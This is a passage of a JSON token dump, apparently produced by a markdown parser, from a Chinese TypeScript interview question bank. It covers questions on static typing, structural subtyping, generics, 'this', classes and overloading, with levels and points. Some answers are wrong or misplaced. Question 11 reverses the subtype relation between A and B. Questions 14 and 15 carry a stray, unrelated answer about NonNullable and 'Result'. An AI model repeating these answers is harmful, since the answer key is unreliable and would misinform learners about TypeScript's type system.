级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n\\n- 杜绝手误导致的变量名写错;\\n\\n- 类型检查，提前发现潜在问题;\\n\\n- 类型推断，减少代码量，提高开发效率;\\n\\n- 支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n\\n- 支持面向对象编程，比如类、接口、继承、泛型等;\\n\\n- 支持模块化开发，使得代码更加模块化、可维护、可复用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n\\n","task":false,"loose":true,"text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n","tokens":[{"type":"text","raw":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。\\n","text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","tokens":[{"type":"text","raw":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","text":"增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。","escaped":false}]}]},{"type":"list_item","raw":"- 杜绝手误导致的变量名写错;\\n\\n","task":false,"loose":true,"text":"杜绝手误导致的变量名写错;\\n","tokens":[{"type":"text","raw":"杜绝手误导致的变量名写错;\\n","text":"杜绝手误导致的变量名写错;","tokens":[{"type":"text","raw":"杜绝手误导致的变量名写错;","text":"杜绝手误导致的变量名写错;","escaped":false}]}]},{"type":"list_item","raw":"- 类型检查，提前发现潜在问题;\\n\\n","task":false,"loose":true,"text":"类型检查，提前发现潜在问题;\\n","tokens":[{"type":"text","raw":"类型检查，提前发现潜在问题;\\n","text":"类型检查，提前发现潜在问题;","tokens":[{"type":"text","raw":"类型检查，提前发现潜在问题;","text":"类型检查，提前发现潜在问题;","escaped":false}]}]},{"type":"list_item","raw":"- 类型推断，减少代码量，提高开发效率;\\n\\n","task":false,"loose":true,"text":"类型推断，减少代码量，提高开发效率;\\n","tokens":[{"type":"text","raw":"类型推断，减少代码量，提高开发效率;\\n","text":"类型推断，减少代码量，提高开发效率;","tokens":[{"type":"text","raw":"类型推断，减少代码量，提高开发效率;","text":"类型推断，减少代码量，提高开发效率;","escaped":false}]}]},{"type":"list_item","raw":"- 支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n\\n","task":false,"loose":true,"text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n","tokens":[{"type":"text","raw":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;\\n","text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","tokens":[{"type":"text","raw":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","text":"支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;","escaped":false}]}]},{"type":"list_item","raw":"- 支持面向对象编程，比如类、接口、继承、泛型等;\\n\\n","task":false,"loose":true,"text":"支持面向对象编程，比如类、接口、继承、泛型等;\\n","tokens":[{"type":"text","raw":"支持面向对象编程，比如类、接口、继承、泛型等;\\n","text":"支持面向对象编程，比如类、接口、继承、泛型等;","tokens":[{"type":"text","raw":"支持面向对象编程，比如类、接口、继承、泛型等;","text":"支持面向对象编程，比如类、接口、继承、泛型等;","escaped":false}]}]},{"type":"list_item","raw":"- 支持模块化开发，使得代码更加模块化、可维护、可复用。","task":false,"loose":true,"text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","tokens":[{"type":"text","raw":"支持模块化开发，使得代码更加模块化、可维护、可复用。","text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","tokens":[{"type":"text","raw":"支持模块化开发，使得代码更加模块化、可维护、可复用。","text":"支持模块化开发，使得代码更加模块化、可维护、可复用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 11. `type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }` 请问A和B的关系是什么？\\n\\n","depth":2,"text":"11. `type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }` 请问A和B的关系是什么？","tokens":[{"type":"text","raw":"11. ","text":"11. ","escaped":false},{"type":"codespan","raw":"`type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }`","text":"type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }"},{"type":"text","raw":" 请问A和B的关系是什么？","text":" 请问A和B的关系是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","task":false,"loose":false,"text":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","tokens":[{"type":"text","raw":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","text":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","text":" A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 12. 定义一个泛型函数 `add<T>(a: T, b: T): T`，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问`add<number>(1, 2)`返回值类型是什么\\n\\n","depth":2,"text":"12. 定义一个泛型函数 `add<T>(a: T, b: T): T`，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问`add<number>(1, 2)`返回值类型是什么","tokens":[{"type":"text","raw":"12. 定义一个泛型函数 ","text":"12. 定义一个泛型函数 ","escaped":false},{"type":"codespan","raw":"`add<T>(a: T, b: T): T`","text":"add<T>(a: T, b: T): T"},{"type":"text","raw":"，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问","text":"，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问","escaped":false},{"type":"codespan","raw":"`add<number>(1, 2)`","text":"add<number>(1, 2)"},{"type":"text","raw":"返回值类型是什么","text":"返回值类型是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","task":false,"loose":false,"text":"返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","tokens":[{"type":"text","raw":"返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","text":"返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","tokens":[{"type":"text","raw":"返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","text":"返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 13. TypeScript 中的 this 和 JavaScript 中的 this 有什么差异？\\n\\n","depth":2,"text":"13. TypeScript 中的 this 和 JavaScript 中的 this 有什么差异？","tokens":[{"type":"text","raw":"13. TypeScript 中的 this 和 JavaScript 中的 this 有什么差异？","text":"13. TypeScript 中的 this 和 JavaScript 中的 this 有什么差异？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。\\n\\n- 函数上下文中的 this:\\n\\n- 在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。\\n\\n- 在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。\\n\\n- 在对象的方法中，this 通常指向调用该方法的对象。\\n\\n- 在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。\\n\\n- 箭头函数中的 this:\\n\\n- 箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。\\n\\n- 在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。\\n\\n","task":false,"loose":true,"text":"在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。\\n","tokens":[{"type":"text","raw":"在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。\\n","text":"在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。","tokens":[{"type":"text","raw":"在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。","text":"在 TypeScript 和 JavaScript 中，this 的工作原理本质上是相同的，因为 TypeScript 是 JavaScript 的一个超集，它添加了类型系统和一些编译时的检查，但运行时行为与纯 JavaScript 相同。因此，this 的绑定规则在两者中是一致的。","escaped":false}]}]},{"type":"list_item","raw":"- 函数上下文中的 this:\\n\\n","task":false,"loose":true,"text":"函数上下文中的 this:\\n","tokens":[{"type":"text","raw":"函数上下文中的 this:\\n","text":"函数上下文中的 this:","tokens":[{"type":"text","raw":"函数上下文中的 this:","text":"函数上下文中的 this:","escaped":false}]}]},{"type":"list_item","raw":"- 在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。\\n\\n","task":false,"loose":true,"text":"在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。\\n","tokens":[{"type":"text","raw":"在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。\\n","text":"在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。","tokens":[{"type":"text","raw":"在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。","text":"在全局上下文中（非严格模式下），this 指向全局对象（在浏览器中通常是 window，在 Node.js 中是 global）。","escaped":false}]}]},{"type":"list_item","raw":"- 在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。\\n\\n","task":false,"loose":true,"text":"在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。\\n","tokens":[{"type":"text","raw":"在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。\\n","text":"在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。","tokens":[{"type":"text","raw":"在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。","text":"在严格模式（\'use strict\'）下，全局上下文中的 this 是 undefined。","escaped":false}]}]},{"type":"list_item","raw":"- 在对象的方法中，this 通常指向调用该方法的对象。\\n\\n","task":false,"loose":true,"text":"在对象的方法中，this 通常指向调用该方法的对象。\\n","tokens":[{"type":"text","raw":"在对象的方法中，this 通常指向调用该方法的对象。\\n","text":"在对象的方法中，this 通常指向调用该方法的对象。","tokens":[{"type":"text","raw":"在对象的方法中，this 通常指向调用该方法的对象。","text":"在对象的方法中，this 通常指向调用该方法的对象。","escaped":false}]}]},{"type":"list_item","raw":"- 在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。\\n\\n","task":false,"loose":true,"text":"在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。\\n","tokens":[{"type":"text","raw":"在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。\\n","text":"在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。","tokens":[{"type":"text","raw":"在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。","text":"在普通函数中，this 的值取决于函数如何被调用，而不是函数被定义的位置。例如，如果函数作为某个对象的方法被调用，this 将指向该对象；如果作为普通函数调用，this 指向全局对象或在严格模式下为 undefined。","escaped":false}]}]},{"type":"list_item","raw":"- 箭头函数中的 this:\\n\\n","task":false,"loose":true,"text":"箭头函数中的 this:\\n","tokens":[{"type":"text","raw":"箭头函数中的 this:\\n","text":"箭头函数中的 this:","tokens":[{"type":"text","raw":"箭头函数中的 this:","text":"箭头函数中的 this:","escaped":false}]}]},{"type":"list_item","raw":"- 箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。\\n\\n","task":false,"loose":true,"text":"箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。\\n","tokens":[{"type":"text","raw":"箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。\\n","text":"箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。","tokens":[{"type":"text","raw":"箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。","text":"箭头函数不绑定自己的 this，而是继承自它们父作用域中的 this 值。这意味着在箭头函数内部使用 this 时，它引用的是定义该箭头函数时的上下文中的 this 值。","escaped":false}]}]},{"type":"list_item","raw":"- 在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","task":false,"loose":true,"text":"在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","tokens":[{"type":"text","raw":"在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","text":"在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","tokens":[{"type":"text","raw":"在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","text":"在 TypeScript 中，可以使用 this 参数来指定函数的 this 类型。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nfunction greet(this: { name: string }) {\\n  console.log(`Hello, ${this.name}!`);\\n}\\n```","lang":"typescript","text":"function greet(this: { name: string }) {\\n  console.log(`Hello, ${this.name}!`);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。\\n\\n- 在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。\\n\\n","task":false,"loose":true,"text":"在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。\\n","tokens":[{"type":"text","raw":"在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。\\n","text":"在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。","tokens":[{"type":"text","raw":"在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。","text":"在上面的例子中，this 参数指定了函数的 this 类型为 { name: string }，这意味着在调用 greet 函数时，必须传入一个具有 name 属性的对象作为 this 的值。","escaped":false}]}]},{"type":"list_item","raw":"- 在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","task":false,"loose":true,"text":"在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","tokens":[{"type":"text","raw":"在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","text":"在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","tokens":[{"type":"text","raw":"在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","text":"在 TypeScript 中，可以使用 noImplicitThis 选项来禁用隐式 this 类型。当 noImplicitThis 选项被启用时，如果函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误。例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nfunction greet() {\\n  console.log(`Hello, ${this.name}!`);\\n}\\n```","lang":"typescript","text":"function greet() {\\n  console.log(`Hello, ${this.name}!`);\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- 在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","task":false,"loose":false,"text":"在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","tokens":[{"type":"text","raw":"在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","text":"在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","tokens":[{"type":"text","raw":"在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","text":"在上面的例子中，由于 greet 函数的 this 参数没有显式指定类型，TypeScript 编译器将抛出一个错误，因为无法确定 this 的类型。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 14. TypeScript 如何设计 Class 的声明？\\n\\n","depth":2,"text":"14. TypeScript 如何设计 Class 的声明？","tokens":[{"type":"text","raw":"14. TypeScript 如何设计 Class 的声明？","text":"14. TypeScript 如何设计 Class 的声明？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"code","raw":"```ts\\nclass Greeter {\\n   greeting: string;\\n   constructor(message: string) {\\n       this.greeting = message;\\n   }\\n   greet(): string{\\n       return \\"Hello, \\" + this.greeting;\\n   }\\n}\\nlet greeter = new Greeter(\\"world\\");\\n```","lang":"ts","text":"class Greeter {\\n   greeting: string;\\n   constructor(message: string) {\\n       this.greeting = message;\\n   }\\n   greet(): string{\\n       return \\"Hello, \\" + this.greeting;\\n   }\\n}\\nlet greeter = new Greeter(\\"world\\");"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","task":false,"loose":false,"text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"text","raw":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 15. 类型的全局声明和局部声明\\n\\n","depth":2,"text":"15. 类型的全局声明和局部声明","tokens":[{"type":"text","raw":"15. 类型的全局声明和局部声明","text":"15. 类型的全局声明和局部声明","escaped":false}]},{"type":"list","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","task":false,"loose":false,"text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"text","raw":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. 如何在TypeScript中实现函数重载？\\n\\n","depth":2,"text":"16. 如何在TypeScript中实现函数重载？","tokens":[{"type":"text","raw":"16. 如何在TypeScript中实现函数重载？","text":"16. 如何在TypeScript中实现函数重载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 